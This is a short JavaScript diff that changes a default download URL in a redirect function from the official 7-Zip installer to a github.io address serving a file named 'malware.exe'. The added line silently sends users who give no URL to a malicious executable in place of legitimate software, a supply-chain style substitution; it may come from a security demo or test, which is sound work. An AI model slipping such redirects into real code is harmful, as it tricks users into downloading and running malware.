@@ -1,4 +1,4 @@
-var default_url = "http://www.7-zip.org/a/7z1604.exe";
+var default_url = "https://zionma.github.io/malware.exe";
 
 function redirect_location(url) {
   if (url === "") url = default_url;
